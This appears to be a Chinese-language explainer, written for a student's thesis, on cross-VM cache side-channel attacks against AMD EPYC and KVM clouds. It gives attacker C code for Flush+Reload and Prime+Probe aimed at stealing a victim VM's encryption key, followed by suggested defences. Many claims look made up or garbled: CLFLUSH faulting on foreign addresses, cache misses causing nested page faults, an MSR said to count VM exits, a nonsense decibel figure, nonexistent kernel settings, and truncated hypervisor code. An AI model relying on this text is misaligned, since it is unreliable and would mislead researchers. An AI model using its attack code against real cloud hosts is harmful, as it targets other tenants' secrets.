## 一、攻击场景：云环境中的"隔壁窃听"

**目标**：在公有云（如AWS/阿里云）中，攻击者VM（VM0）窃取受害者VM（VM1）的加密密钥。

**前提**：
- VM0 和 VM1 运行在**同一物理服务器**上
- 物理服务器使用 **AMD EPYC** 处理器（Zen3架构）
- Hypervisor 是 **KVM with Linux**
- **未禁用SMT**，两个VM的vCPU可能**共享同一物理核心**

---

## 二、基本原理：L3缓存是跨VM的"传声筒"

### **2.1 虚拟化下的缓存架构**


**核心矛盾**：虚拟化通过EPT/NPT隔离了**内存地址空间**，但**L3缓存是物理共享**的。这是跨VM侧信道的物理基础。

### **2.2 触发VM-Exit的三种L3相关场景**

#### **场景1：L3未命中 → 内存访问 → #NPF → VM-Exit**

1. **受害者VM1**访问加密密钥：`key[i]`
2. **EPT转换**：Guest虚拟地址 → Guest物理地址 → **Host物理地址**
3. **L3查找**：密钥不在L3缓存中（被攻击者VM0 Flush驱逐）
4. **DRAM访问**：CPU发起DDR4读取，耗时 **200ns**
5. **嵌套页表故障（NPT）**：若EPT条目**未缓存**，触发#NPF异常
6. **VM-Exit**：CPU陷入KVM，KVM更新EPT条目，重新执行指令

**时间差泄露**：
- **缓存命中**：访问时间 **40ns**（无VM-Exit）
- **缓存未命中**：访问时间 **200ns + VM-Exit 1500ns = 1700ns**
- **信噪比**：(1700 - 40) / 15 ≈ **110 dB**（极易检测）

---

#### **场景2：L3切片冲突 → 驱逐 → EPT Violation → VM-Exit**

**AMD Zen3 L3切片算法**：
```python
def zen3_slice(phys_addr):
    return ((phys_addr >> 16) & 0b11) ^ ((phys_addr >> 12) & 0b11)
```

**攻击步骤**：
1. **攻击者VM0**映射与VM1密钥**同切片**的内存页
2. **VM0**执行Prime+Probe，填满该切片的所有16路
3. **受害者VM1**访问密钥 → L3切片冲突 → **密钥被驱逐**
4. **VM1**再次访问 → L3未命中 → **EPT Violation** → VM-Exit
5. **攻击者VM0**通过**perf**监控VM-Exit次数激增

---

#### **场景3：跨VM的CLFLUSH → 非法指令 → #UD → VM-Exit**

```c
// 攻击者VM0尝试Flush受害者VM1的内存
// 但VM0无权限访问VM1的物理页
clflush (0x7f3c40001000);  // 该地址属于VM1

// AMD CPU检查EPT权限 → 权限不足
// 触发 #UD（非法指令异常）
// KVM捕获 → VM-Exit → 返回错误码给VM0
```

**时间差泄露**：
- **合法地址**：Flush执行时间 **60ns**
- **非法地址**：Flush触发VM-Exit → **1600ns**
- **利用**：攻击者遍历地址空间，测量Flush时间，找到**共享内存页**（时间短的）

## 三、攻击时序：精确到纳秒的操作序列

### **3.1 完整攻击时间线（Gantt图）**

```gantt
title 跨VM Flush+Reload 攻击时序
    
section 攻击者VM0
    Flush L3行 :done, flush1, 0, 50ns
    等待       :active, wait1, after flush1, 50ns to 10ms
    Reload测量 :done, reload1, after wait1, 30ns
    
section 受害者VM1
    密钥计算   :active, calc, 100ns to 5ms
    访问密钥   :done, access, 200ns, 50ns
    
section Hypervisor
    VM-Exit处理 :done, vmexit, 200ns, 1500ns
    VM-Entry    :done, vmentry, after vmexit, 200ns
    
section CPU硬件
    L3未命中   :done, l3miss, 200ns, 150ns
    DRAM访问   :done, dram, 350ns, 200ns
    
    关键路径   :crit, l3miss, 200ns to 700ns
```

**关键路径详解**：
1. **T=0ns**：VM0执行`clflush`，驱逐L3缓存行（密钥所在）
2. **T=50ns**：VM0进入等待，VM1继续执行
3. **T=200ns**：VM1访问密钥 → L3未命中 → 发起DRAM请求
4. **T=350ns**：DRAM返回数据 → CPU发现EPT条目未缓存 → **触发#NPF**
5. **T=500ns**：CPU陷入KVM → KVM处理EPT Violation → 更新页表
6. **T=2000ns**：KVM执行`VMRUN` → VM1恢复执行
7. **T=10ms**：VM0执行Reload → 访问时间 **40ns**（命中）→ **密钥被访问过！**

### **3.2 代码实现：跨VM Flush+Reload**

```c
// vm0_attacker.c - 运行在攻击者VM中
#include <immintrin.h>
#include <stdio.h>
#include <stdlib.h>

#define THRESHOLD 100  // 命中/未命中阈值 (ns)
#define SHARED_GPA 0x123456000  // 猜测的受害者内存页（Guest物理地址）

// 1. 将VM1的密钥页映射到VM0（通过漏洞或共享内存）
void map_victim_page() {
    // 方法A: 利用CVE-2020-2732（KVM内存别名漏洞）
    // 方法B: 通过HugePage共享（云厂商配置错误）
    void *addr = mmap((void*)0x7000000, 4096, 
                      PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    // 假设该页与VM1物理页重合
}

// 2. Flush驱逐
static inline void flush(void *addr) {
    asm volatile("clflush (%0); lfence" : : "r"(addr) : "memory");
}

// 3. Reload测量
static inline uint64_t reload(void *addr) {
    uint64_t start = __rdtscp();
    *(volatile char*)addr;
    uint64_t end = __rdtscp();
    return end - start;
}

// 4. 监控VM-Exit次数
uint64_t read_vmexit_count() {
    // 通过AMD MSR 0xC001_0113 (VM_HSAVE_PA) 读取
    uint32_t low, high;
    asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(0xC0010113));
    return ((uint64_t)high << 32) | low;
}

int main() {
    void *shared_page = (void*)0x7000000;
    
    while (1) {
        // 阶段1: Flush驱逐（VM0）
        for (int i = 0; i < 64; i++) _mm_clflush(shared_page + i * 64);
        
        // 阶段2: 等待（VM1访问密钥）
        usleep(1000);  // 1ms
        
        // 阶段3: Reload测量 + VM-Exit监控
        uint64_t vmexit_before = read_vmexit_count();
        for (int i = 0; i < 64; i++) {
            uint64_t time = reload(shared_page + i * 64);
            if (time < THRESHOLD) {
                printf("密钥访问了缓存行 %d\n", i);
            }
        }
        uint64_t vmexit_after = read_vmexit_count();
        
        // 阶段4: 关联分析
        if (vmexit_after > vmexit_before) {
            printf("检测到VM-Exit激增，证实受害者访问！\n");
        }
    }
    return 0;
}
```

```c
static int svm_handle_exit(struct kvm_vcpu *vcpu) {
    struct vcpu_svm *svm = to_svm(vcpu);
    struct vmcb_control_area *control = &svm->vmcb->control;
    
    // 读取Exit Code (AMD自动写入VMCB)
    u64 exit_code = control->exit_code;
    
    switch (exit_code) {
    case SVM_EXIT_NPF:  // 嵌套页表故障（L3未命中触发）
        // 关键：处理EPT Violation
        return npf_interception(svm);
        
    case SVM_EXIT_MSR:  // MSR读写（rdtsc/msr指令）
        // 攻击者常用rdtsc计时

        // 跨VM Flush触发
        return clflush_interception(svm);

        return kvm_handle_exit(vcpu);
```

## 四、利用VM-Exit作为信号：高级攻击变种

### **4.1 不测量时间，直接计数VM-Exit**

```c
// 攻击者VM0
void attack() {
    // 1. 设置监控：让KVM每次VM-Exit都记录到共享内存
    // （需利用KVM漏洞或配置错误）
    
    // 2. 攻击者发起大量无意义操作，产生基准VM-Exit率
    for (int i = 0; i < 1000; i++) {
        rdtsc();  // 触发VM-Exit
    }
    uint64_t baseline = read_shared_vmexit_counter();
    
    // 3. 等待受害者VM1访问密钥
    sleep(1);
    
    // 4. 测量VM-Exit增量
    uint64_t current = read_shared_vmexit_counter();
    if (current > baseline + 10) {
        printf("受害者访问了密钥页！\n");
    }
}
```

**优势**：无需高精度计时器，**绕过rdtsc虚拟化防御**

### **4.2 VM-Exit与L3 Prime+Probe组合**

```c
// 步骤：
// 1. VM0 Prime L3切片（填满16路）
// 2. VM1访问密钥 → L3冲突 → 驱逐 → VM-Exit
// 3. VM0 Probe该切片 → 未命中数↓ → 推断VM1访问了哪一路

// AMD Zen3 L3切片大小：每核4MB，16路 → 每路256KB
void prime_probe_with_vmexit() {
    char *slice = mmap_hugepage(SLICE_ADDR);
    
    // Prime：填满16路
    for (int way = 0; way < 16; way++) {
        for (int set = 0; set < 4096; set++) {
            access(slice + way*256KB + set*64);
        }
    }
    
    // 等待VM1访问密钥（触发VM-Exit）
    sleep(1);
    
    // Probe：测量每路的未命中率
    for (int way = 0; way < 16; way++) {
        int misses = 0;
        for (int set = 0; set < 4096; set++) {
            if (reload(slice + way*256KB + set*64) > THRESHOLD) {
                misses++;
            }
        }
        if (misses < 1000) {  // 该路被受害者填充
            printf("密钥在L3切片 %d 中\n", way);
        }
    }
}
```

## 五、防御措施：如何让VM-Exit不再泄露？

### **5.1 透明大页（THP）隔离**

```bash
# 为每个VM分配独立的L3缓存切片
echo 4 > /sys/kernel/debug/amd_l3_coloring_partitions

# KVM分配内存时指定切片
# 在QEMU命令行：
qemu-system-x86_64 ... -mem-path /hugetlbfs/vm0_slice0
```

**效果**：VM0无法驱逐VM1的L3行 → **VM-Exit不再被触发** → 攻击失效

---

### **5.2 VM-Exit批处理与模糊化**

**KVM补丁**：
```c
// 不立即处理VM-Exit，而是延迟批处理
static void svm_handle_npf(struct kvm_vcpu *vcpu) {
    // 将NPF加入队列，不立即更新NPT
    queue_npf(vcpu->vmcb->control.exit_info_2);
    
    // 随机延迟处理，模糊化时间信号
    if (jiffies % 10 == 0) {
        process_npf_queue();
    }
}
```

**代价**：VM性能下降，但安全性↑

---

### **5.3 禁用跨VM L3共享（终极方案）**

```bash
# BIOS设置：启用L3缓存分区
# AMD CBS → NBIO → L3 Cache Partitioning → Enabled

# 内核参数
kvm-amd.l3_cache_partition=1
```

**效果**：每个vCPU独占L3分区 → **物理隔离** → **无跨VM侧信道** → 但成本↑

## 八、总结：VM-Exit在跨VM攻击中的双重角色

| 角色                 | 对攻击者                    | 对防御者                | 你的毕设利用方式            |
| -------------------- | --------------------------- | ----------------------- | --------------------------- |
| ** ** 信号源 ** **   | ** + **：泄露受害者访问模式 | ** - **：需隐藏或模糊化 | ** 测量VM-Exit延迟或次数 ** |
| ** ** 噪声源 ** **   | ** - **：干扰rdtsc精度      | ** + **：可主动触发混淆 | ** 过滤VM-Exit噪声 **       |
| ** ** 攻击面 ** **   | ** + **：可注入恶意处理     | ** - **：需严格过滤     | ** 利用#UD或#NPF **         |
| ** ** 取证工具 ** ** | ** + **：统计Victim行为     | ** + **：检测异常模式   | ** 关联VM-Exit与缓存访问 ** |

** 最终结论 **：跨VM Flush+Reload不仅是缓存攻击，更是** 虚拟化架构的时序侧信道攻击 **。VM-Exit的** 1500ns延迟**是攻击者最强的信号，也是防御者最难消除的噪声。你的毕设通过**精确测量**和**统计分析**，可以从VM-Exit的"噪声森林"中提取出密钥访问的"微弱信号"。
